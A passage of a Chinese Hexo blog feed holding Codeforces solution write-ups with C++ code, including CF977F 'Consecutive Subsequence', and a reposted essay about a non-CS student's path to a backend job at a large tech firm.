plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a 150</span><br><span class="line">c 170</span><br><span class="line">d 180</span><br><span class="line">b 160</span><br></pre></td></tr></table></figure><p>Input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">vasya 0</span><br><span class="line">petya 1</span><br><span class="line">manya 3</span><br><span class="line">dunay 3</span><br></pre></td></tr></table></figure><p>Output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>逆向思维 通过给先处理的对象分配更大的身高值，使得后续插入的对象只需关注当前位置前需要有多少更高的人。</p><p>具体步骤如下：</p><ol><li>预处理排序。将所有人按a_i值从小到大排序，这样优先处理需要更少高个子在前的对象;</li><li>逆向分配身高。初始身高k从最大值n开始递减，后续插入的人会获得更小的身高值（但实际值仍是递减的）;</li><li>动态队列构建。将当前对象插入到队列的第a[x]个位置，由于处理顺序是a_i升序，插入时已保证前面已有足够多更高的人（身高值k更大）;</li><li>身高映射逻辑。先处理的人获得更大的身高值（k从n递减），后插入的人会站在队列更后方，但身高更矮;</li><li>输出最终队列。按构造后的队列顺序输出结果，队列中每个位置i满足：前面正好有a[i]个更高身高的人.</li></ol><h6 id="AC-Code：-1"><a href="#AC-Code：-1" class="headerlink" title="AC Code："></a>AC Code：</h6><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">s</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(n)</span>, <span class="title">ord</span><span class="params">(n)</span>, <span class="title">h</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++ i) cin &gt;&gt; s[i] &gt;&gt; a[i], ord[i] = i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sort</span> (ord.<span class="built_in">begin</span>(), ord.<span class="built_in">end</span>(), [&amp;](<span class="type">int</span> i, <span class="type">int</span> j)&#123;<span class="keyword">return</span> a[i] &lt; a[j];&#125;);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, k = n; i &lt; n; k -- ) &#123;</span><br><span class="line">        <span class="type">int</span> x = ord[i ++ ];</span><br><span class="line">        <span class="keyword">if</span> (a[x] &gt; v.<span class="built_in">size</span>()) <span class="keyword">return</span> cout &lt;&lt; <span class="number">-1</span>, <span class="number">0</span>;</span><br><span class="line">        h[x] = k;</span><br><span class="line">        v.<span class="built_in">insert</span>(v.<span class="built_in">begin</span>() + a[x], x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> x : v) cout &lt;&lt; s[x] &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; h[x] &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Daily-CF题解&quot;&gt;&lt;a href=&quot;#Daily-CF题解&quot; class=&quot;headerlink&quot; title=&quot;Daily_CF题解&quot;&gt;&lt;/a&gt;Daily_CF题解&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本文记录JiangnanPsalter参与&lt;a h</summary>
      
    
    
    
    <category term="我的基础算法笔记" scheme="https://touristdaughter.cyou/categories/%E6%88%91%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>CF977F题解</title>
    <link href="https://touristdaughter.cyou/2025/05/05/CF977F/"/>
    <id>https://touristdaughter.cyou/2025/05/05/CF977F/</id>
    <published>2025-05-05T07:14:20.040Z</published>
    <updated>2025-05-06T03:23:42.943Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来源：<a href="https://codeforces.com/contest/977/problem/F">CF977F. Consecutive Subsequence</a></p></blockquote><h1 id="F-Consecutive-Subsequence"><a href="#F-Consecutive-Subsequence" class="headerlink" title="F. Consecutive Subsequence"></a>F. Consecutive Subsequence</h1><blockquote><p>time limit per test 2 seconds<br>memory limit per test 256 megabytes</p></blockquote><p>You are given an integer array of length n.</p><p>You have to choose some subsequence of this array of maximum length such that this subsequence forms a increasing sequence of consecutive integers. In other words the required sequence should be equal to [x,x+1,…,x+k−1][x,x+1,…,x+k−1] for some value x and length k.</p><p>Subsequence of an array can be obtained by erasing some (possibly zero) elements from the array. You can erase any elements, not necessarily going successively. The remaining elements preserve their order. For example, for the array [5,3,1,2,4] the following arrays are subsequences: [3], [5,3,1,2,4], [5,1,4], but the array [1,3] is not.</p><p>Input</p><p>The first line of the input containing integer number n (1≤n≤2⋅1051≤n≤2⋅105) — the length of the array. The second line of the input containing n integer numbers a1,a2,…,an (1≤ai≤1091≤ai≤109) — the array itself.</p><p>Output</p><p>On the first line print k — the maximum length of the subsequence of the given array that forms an increasing sequence of consecutive integers.</p><p>On the second line print the sequence of the indices of the <strong>any</strong> maximum length subsequence of the given array that forms an increasing sequence of consecutive integers.</p><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><h4 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7</span><br><span class="line">3 3 4 7 5 6 8</span><br></pre></td></tr></table></figure><h4 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2 3 5 6 </span><br></pre></td></tr></table></figure><h4 id="Input-1"><a href="#Input-1" class="headerlink" title="Input"></a>Input</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">1 3 5 2 4 6</span><br></pre></td></tr></table></figure><h4 id="Output-1"><a href="#Output-1" class="headerlink" title="Output"></a>Output</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">1 4 </span><br></pre></td></tr></table></figure><h4 id="Input-2"><a href="#Input-2" class="headerlink" title="Input"></a>Input</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">10 9 8 7</span><br></pre></td></tr></table></figure><h4 id="Output-2"><a href="#Output-2" class="headerlink" title="Output"></a>Output</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1 </span><br></pre></td></tr></table></figure><h4 id="Input-3"><a href="#Input-3" class="headerlink" title="Input"></a>Input</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9</span><br><span class="line">6 7 8 3 4 5 9 10 11</span><br></pre></td></tr></table></figure><h4 id="Output-3"><a href="#Output-3" class="headerlink" title="Output"></a>Output</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">1 2 3 7 8 9 </span><br></pre></td></tr></table></figure><h4 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h4><p>All valid answers for the first example (as sequences of indices):</p><ul><li>[1,3,5,6]</li><li>[2,3,5,6]</li></ul><p>All valid answers for the second example:</p><ul><li>[1,4]</li><li>[2,5]</li><li>[3,6]</li></ul><p>All valid answers for the third example:</p><ul><li>[1]</li><li>[2]</li><li>[3]</li><li>[4]</li></ul><p>All valid answers for the fourth example:</p><ul><li>[1,2,3,7,8,9]</li></ul><h2 id="题意：先输入原序列的长度和数组，题意简单来说就是找到原序列的最长连续递增子序列，然后输出长度（个数）和最长连续递增子序列在原序列中的1-based索引"><a href="#题意：先输入原序列的长度和数组，题意简单来说就是找到原序列的最长连续递增子序列，然后输出长度（个数）和最长连续递增子序列在原序列中的1-based索引" class="headerlink" title="题意：先输入原序列的长度和数组，题意简单来说就是找到原序列的最长连续递增子序列，然后输出长度（个数）和最长连续递增子序列在原序列中的1-based索引"></a>题意：先输入原序列的长度和数组，题意简单来说就是找到原序列的最长连续递增子序列，然后输出长度（个数）和最长连续递增子序列在原序列中的1-based索引</h2><h2 id="思路：哈希记录每个数值最后出现的位置，检查前驱和动态规划状态转移，最后逆向回溯构建结果序列、反转得到正序-输出结果"><a href="#思路：哈希记录每个数值最后出现的位置，检查前驱和动态规划状态转移，最后逆向回溯构建结果序列、反转得到正序-输出结果" class="headerlink" title="思路：哈希记录每个数值最后出现的位置，检查前驱和动态规划状态转移，最后逆向回溯构建结果序列、反转得到正序 输出结果"></a>思路：哈希记录每个数值最后出现的位置，检查前驱和动态规划状态转移，最后逆向回溯构建结果序列、反转得到正序 输出结果</h2><h2 id="AC-Code"><a href="#AC-Code" class="headerlink" title="AC Code"></a>AC Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[N], dp[N], prev_idx[N];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __cplusplus &gt;= 201703L</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAFE_MODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAFE_MODE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++ i) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="comment">// 预处理每个数值的最近索引</span></span><br><span class="line">unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; last_pos;</span><br><span class="line"><span class="type">int</span> max_len = <span class="number">0</span>, best_end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++ i) &#123;</span><br><span class="line"><span class="type">int</span> val = a[i];</span><br><span class="line">        <span class="comment">// 检查前驱元素是否存在</span></span><br><span class="line"><span class="keyword">if</span> (last_pos.<span class="built_in">find</span>(val - <span class="number">1</span>) != last_pos.<span class="built_in">end</span>()) &#123;</span><br><span class="line"><span class="type">int</span> j = last_pos[val - <span class="number">1</span>];</span><br><span class="line">dp[i] = dp[j] + <span class="number">1</span>;</span><br><span class="line">prev_idx[i] = j;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dp[i] = <span class="number">1</span>;</span><br><span class="line">prev_idx[i] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 更新当前数值的最近位置</span></span><br><span class="line">last_pos[val] = i;</span><br><span class="line">        <span class="comment">// 记录最长子序列信息</span></span><br><span class="line"><span class="keyword">if</span> (dp[i] &gt; max_len) &#123;</span><br><span class="line">max_len = dp[i];</span><br><span class="line">best_end = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 逆向构造结果</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = best_end; i != <span class="number">-1</span>; i = prev_idx[i]) &#123;</span><br><span class="line">res.<span class="built_in">push_back</span>(i + <span class="number">1</span>);<span class="comment">// 转换为1-based索引</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max_len);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> x : res) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">solve</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;题目来源：&lt;a href=&quot;https://codeforces.com/contest/977/problem/F&quot;&gt;CF977F. Consecutive Subsequence&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;F-</summary>
      
    
    
    
    <category term="我的基础算法笔记" scheme="https://touristdaughter.cyou/categories/%E6%88%91%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>二本学院非科班天崩开局，如何逆天改命拿下大厂后端</title>
    <link href="https://touristdaughter.cyou/2025/04/27/%E4%BA%8C%E6%9C%AC%E5%AD%A6%E9%99%A2%E9%9D%9E%E7%A7%91%E7%8F%AD%E5%A4%A9%E5%B4%A9%E5%BC%80%E5%B1%80%EF%BC%8C%E5%A6%82%E4%BD%95%E9%80%86%E5%A4%A9%E6%94%B9%E5%91%BD%E6%8B%BF%E4%B8%8B%E5%A4%A7%E5%8E%82%E5%90%8E%E7%AB%AF/"/>
    <id>https://touristdaughter.cyou/2025/04/27/%E4%BA%8C%E6%9C%AC%E5%AD%A6%E9%99%A2%E9%9D%9E%E7%A7%91%E7%8F%AD%E5%A4%A9%E5%B4%A9%E5%BC%80%E5%B1%80%EF%BC%8C%E5%A6%82%E4%BD%95%E9%80%86%E5%A4%A9%E6%94%B9%E5%91%BD%E6%8B%BF%E4%B8%8B%E5%A4%A7%E5%8E%82%E5%90%8E%E7%AB%AF/</id>
    <published>2025-04-27T09:01:32.342Z</published>
    <updated>2025-04-27T09:24:03.873Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>author: <a href="https://lys2021.com/2024/11/road-to-king/">🄻🅈🅂</a></p></blockquote><h1 id="天崩开局，如何破局自救"><a href="#天崩开局，如何破局自救" class="headerlink" title="天崩开局，如何破局自救"></a>天崩开局，如何破局自救</h1><p>2021 年高考结束，我当时的第一志愿是计算机科学与技术专业，但是我被录取到了河南工程学院的高分子材料与工程专业。</p><p>我去咨询计算机相关行业的从业者，以及多方面网络搜集相关信息之后得到了一个很现实的消息——二本学院本+非科班双重debuff对于我想从事的计算机行业来说，就是死局。</p><p>于是我在大一期间的目标其实非常明确：</p><p>自学计算机<br>转专业到计算机科学与技术<br>所以目标有了之后就很简单了，我在暑假开学前就开始学习Python，然后快开学的时候就开始在校内打听转专业相关信息，并且联系到了以前转专业成功的学长。期间还认识了一位打ACM竞赛的优秀学长（也是我之后参加ACM的队友），在他的推荐下，我误打误撞参与到了ACM竞赛相关的学习中。其实我是很功利的，为了转专业成功，我白天学专业课，晚上就学C语言和C++刷算法题，为了能拿一些计算机相关奖项，以便自己在转专业考核中获得足够的优势。</p><p>最后在大一下学期，我以专业第一+综合素质测评双第一的成绩顺利转入到了计科，并开始后续的学习。</p><h1 id="算竞败犬，身无长技该何去何从"><a href="#算竞败犬，身无长技该何去何从" class="headerlink" title="算竞败犬，身无长技该何去何从"></a>算竞败犬，身无长技该何去何从</h1><p>前面讲到我很大一部分参与竞赛的原因是为了拿奖好转专业，不过我在这期间也逐渐喜欢上了ACM竞赛。</p><p>打ACM的有两种人，一种是喜欢算法，享受AC过程的人，一种是为了通过比赛证明自己比别人强的人。</p><p>而我，很遗憾，我是希望打ACM能够给我带来荣誉并且有助于我找个工作的那种人。两年的坚持，不仅证明了我在这个竞赛中毫无天赋，也以破铜烂铁的结局收场。此时的我，该考虑未来做什么了。于是我在分析完一通考研、考公、和找工作的难度后，毅然决然地选择 了找工作。</p><p>于是我开始翻看各种求职网站，看招聘岗位的JD。我懵了，招聘要求的技能我都不知道是啥，我才发现升入大学这一年半多的时间里，自己除了会几道题之外，什么都不会。</p><p>因此，我该确定工作的目标了，走什么方向？前端？后端？运维？语言选什么？C++还是Java？</p><p>我对C++有一种执念，毕竟是打竞赛的老伙计，于是准备走C++服务端开发方向，开始搜罗资料和学习，大二的时候数据结构手搓了STL，并且学习了一下MIT6.S081，同时期我也去了解C++岗位就业形势和方向。最后发现在我学历不占优势的前提下，CPP服务端开发方向好像不是那么明朗，加之后期学习难度陡增，我突然对C++失去兴趣了。于是立刻决定转方向到Java，虽然Java很卷，但是岗位毕竟多一些，混到最后还有一口饭吃。</p><p>在决定转Java后，我又开始搜集资料，在同学推荐下，我开始学习B站up主——<a href="https://space.bilibili.com/37737161">青空の霞光</a>的全套视频，并且指定了阶段计划：</p><p>学完Java全套技术栈<br>做两个项目开始刷实习经历<br>于是接下来的时间里，一个月学完Java语法基础，一个月JavaWeb，一个月Spring全套技术栈学完，再用一个月做完了一个单体项目和一个12306微服务项目，期间做的项目还拿了个软件设计大赛的省奖。</p><p>之后开始找渠道投实习，boss投递1000+，面试5，offer2，开始第一次实习，去了一家初创小公司。在这期间我也完成了第一次开源贡献，利用自己在打比赛期间学习的算法实现了一个QQ机器人违禁词匹配的功能。</p><p>有第一次实习经验后，再投就容易了不少，boss投递300+，面试10，offer8，开始第二次实习，这一次我甚至伪装成毕业生拿下了一个总包25w的offer，使我更加坚信了我也可以做一下大厂梦。最后去了一家行业独角兽企业实习。</p><p>所以其实到这里，我已经很明确以后的路线了，那就是不断通过刷实习经验，骑驴找马，脚踏实地才有机会跻身大厂行列。</p><h1 id="暑期三场KPI面试，干碎我的大厂梦"><a href="#暑期三场KPI面试，干碎我的大厂梦" class="headerlink" title="暑期三场KPI面试，干碎我的大厂梦"></a>暑期三场KPI面试，干碎我的大厂梦</h1><p>在结束第二段实习后，时间来到24年3月份，这个时间段是24届的春招和25届的暑期实习。我想要趁这个机会，拿下大厂的暑期实习offer，然后通过实习转正的方式曲线救国，实现目标。理想很丰满，现实很骨感，当我开始投递之后，我才发现事情没那么简单。</p><p>首先是腾讯，投递完之后就卡在初筛，其次是蚂蚁，投递完做了个人才测评秒挂，最离谱的是米哈游，投完两小时露头就秒，其他大厂投递玩要么卡在初筛，要么直接简历挂。此时我才意识到了问题的严重性，在暑期实习竞争的人中，二本学院+无大厂实习经历的我根本毫无机会。</p><p>于是果断更改策略：</p><p>大厂继续投递<br>中小厂开始海投，并且刷面试经验，有面试就接<br>最后暑期实习只约到了蔚来和腾讯云智的面试，其中蔚来一面，我的实习不问，自我介绍完+基础八股，手撕链表结束，全程只有18分钟。我以为已经够KPI了，谁知道时隔一个月又捞我二面，这次面试官都不装了，连摄像头都不开了。腾讯云智面试则截然相反，照死里拷打八股和我的实习经历，问到最后都开始问我cpu和gpu区别这种问题，我至今没有一场面试难度能够超越这次的实习面试。鉴定为纯纯的面试官炫技，不想要人。</p><p>这三场KPI面试干碎了我想要通过暑期实习转正拿到大厂offer的美梦，于是我最后只能寄希望于秋招，暑期去了北京的一家全球独角兽企业实习。</p><h1 id="搏命秋招，刀尖起舞命悬一线"><a href="#搏命秋招，刀尖起舞命悬一线" class="headerlink" title="搏命秋招，刀尖起舞命悬一线"></a>搏命秋招，刀尖起舞命悬一线</h1><p>在8月底基本上确定了转正offer保底之后，我开始了自己的秋招之旅，并且 ALL IN 中大厂。</p><p>这里贴一下自己的投递记录——<a href="https://tqce3dkd5sf.feishu.cn/base/XslkbUlzYaT7GPs184BcRmp3nKd?from=from_copylink">搏命秋招</a></p><p>从8月底到10月底，官网投递 200+，boss投递 800+。</p><p>9月底约到了深信服面试，整个10月也没有约到几家面试，这段时间的我及其焦虑，刷牛客每天都能看到别人各种大厂面试，各种意向收割，而我只有各种花式挂简历。</p><p>在 10 月中旬，约到了美团后端面试，走到最后排序挂，面试官没有明说但是结合面试聊的学历话题，我很清楚自己挂在了学历上。最后收到这个消息我在厕所里哭了一下午，还把下午的百度测开和360测开的面试推掉了。</p><p>不过那天下午我也悟出一个道理：</p><p>努力把我抬高到了不属于我的高度，现实会把我狠狠摔下，人没有翅膀，但是靠双腿就能翻越一座座高山，所以才会比鸟飞的更高更远。</p><p>于是我在那天之后并没有放弃，继续投递并且迅速调整状态，面对后面即将到来的面试。</p><p>现在回头看，如果不是当初自己迅速调整好，也就没有后来的58同城面试以及网易有道的面试，甚至58二面深度拷打我整整一个半小时的项目，以及网易总监面拷打一小时实习和项目架构设计，我能顶住这些压力的原因也多亏了之前美团的打击，必须抓住每一次难得的机会并且拼尽全力。</p><h1 id="太阳如此伟大，能让尘埃闪耀光芒"><a href="#太阳如此伟大，能让尘埃闪耀光芒" class="headerlink" title="太阳如此伟大，能让尘埃闪耀光芒"></a>太阳如此伟大，能让尘埃闪耀光芒</h1><p>让我一路坚持下来的，不仅仅是我自己的目标，还有那些二本学院进大厂的偶像的先例。</p><p>24年春招我刷到了牛客上一位三本进哈啰的同学的经验帖——<a href="https://www.nowcoder.com/discuss/605798991095140352?sourceSSR=users">24届校招末班车🚙 三本 哈啰Java OC啦~</a></p><p>读完这篇文章后我大受感动，于是在评论区留言“佬，同二本，大厂简历全挂，看完您经历深感惭愧”。</p><p>于是发自内心决定要向大佬看齐，并且在每一次想要放弃的时候都会会想起这些人的成就。</p><p>事实证明，榜样的力量是极大的，在这之后我也实现了我的梦想，我回头去看之前此贴的评论区，发现同期跟我一样是二本学院进大厂的同学，有学院本无竞赛三段大厂实习去了字节跳动的，有学院本去转转的，有学院本拿下腾讯客户端的，有学院本暑期实习转正蔚来的等等。</p><p>我始终认为，一个人的成功不值得骄傲，但是一个人的成功可以带动一群人成功，这才是值得尊敬的，就像伟大的太阳，能够照亮那些充满黑暗的角落，即使散落地上的灰尘也能成为黑夜闪耀的群星。</p><h1 id="干货总结"><a href="#干货总结" class="headerlink" title="干货总结"></a>干货总结</h1><p>感谢你读完了我上面所写的一些个人经历，每个人的成功都很难复制，这条道路上不存在成功的通解，但是我仍然尝试总结一些我认为比较重要的因素：</p><p>目标：必须明确你的方向，你的目的，你的追求<br>信息：必须尝试一切渠道获取相关信息，如何才能在这个行业立足<br>计划：必须根据自身情况定制计划，还要做好兜底措施，且必须留有退路<br>执行：必须坚持计划，局部的偏移会造成全局战略的失败，每一步必须严格执行<br>除此之外，我认为很大程度上，运气也是一个不可忽略的因素，因为我见过太多比我优秀的同学，因为没有得到面试机会导致没有一个满意的结果。</p><p>对于计算机找工作来说，我主观上认为，运气 &gt; 学历 &gt;&#x3D; 实习 &gt; 竞赛 &gt; 学校活动。</p><p>如果运气不够，就只能增加尝试次数，多投递，每次投递都有试错的机会，如果你投递太多已经脏掉了账号比如boss这些，那么建议你注销账户重新新开账户再次投递，一定要多尝试才有机会。</p><p>关于学历，我推荐学历比较差的同学可以考虑一下考研，考研必须考211以上水平的学校，出来会轻松很多，而且多三年的时间给你刷实习和论文。在可预见的未来几年，就业形势仍不是很乐观，你也要做好三年考研出来卡你本科的心理准备。</p><p>关于实习，如果有对口的大厂实习，几乎可以作为你的第二学历，但是这样的条件很难凑成，需要极大的努力和运气加成，其他的没有名气的一律视为小厂。多段实习并不是经验为王，必须能够通过实习所做的事情体现出你的潜力和发展。</p><p>关于竞赛，我认为ACM的奖牌对我找研发相关工作并没有很大的帮助，因为研发更多在意你的工程水平，而不是会做几道题，大厂注重算法也必须是你在工程能力过关的前提之下。如果你的目标是教培或者量化、自驾这些方向，那么ACM的奖项确实是一个比较好的加分项，除此之外的方向性价比极低。</p><p>关于学校活动，我认为对找工作的影响微乎其微，写上你的奖学金和绩点足以。</p><p>关于笔试，我见过有作弊的满分约面最后offer拿到手软，也见过自己老老实实做却0面试的。想要打败掉这些卑鄙的竞争者，你就只能变强，毫无理由的强，强到任何东西都无法阻挡才行。因此笔试题也要刷，我个人因为竞赛经历大部分笔试题都可以ak，所以推荐大一大二的同学能多参加ACM相关竞赛提升自己的算法水平。</p><p>关于面试，面试前可以在牛客找找面经参考一下，面试结束后进行复盘和总结，面试的时候录音，之后花时间重放一下面试里面回答的不好的地方，然后不断优化和改进。</p><p>我还建立了相关的学习 wiki——<a href="https://wiki.lys2021.com/">HAUE-CS-WIKI</a>，有学习路线和课程推荐，后续也会更新一找工作技巧。</p><p>我的个人博客——<a href="https://lys2021.com/">lys2021.com</a>，有我以前学习的笔记，也欢迎一起互相学习。</p><p>最后祝愿在看这篇文章的你有一个光明的前途。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;author: &lt;a href=&quot;https://lys2021.com/2024/11/road-to-king/&quot;&gt;🄻🅈🅂&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;天崩开局，如何破局自救&quot;&gt;&lt;a href=&quot;#天崩开局</summary>
      
    
    
    
    <category term="二本(A/B)のACM协会支持系统博客项目" scheme="https://touristdaughter.cyou/categories/%E4%BA%8C%E6%9C%AC-A-B-%E3%81%AEACM%E5%8D%8F%E4%BC%9A%E6%94%AF%E6%8C%81%E7%B3%BB%E7%BB%9F%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="HAUE" scheme="https://touristdaughter.cyou/tags/HAUE/"/>
    
    <category term="本二ACM" scheme="https://touristdaughter.cyou/tags/%E6%9C%AC%E4%BA%8CACM/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客利用GitHub Pages绑定域名</title>
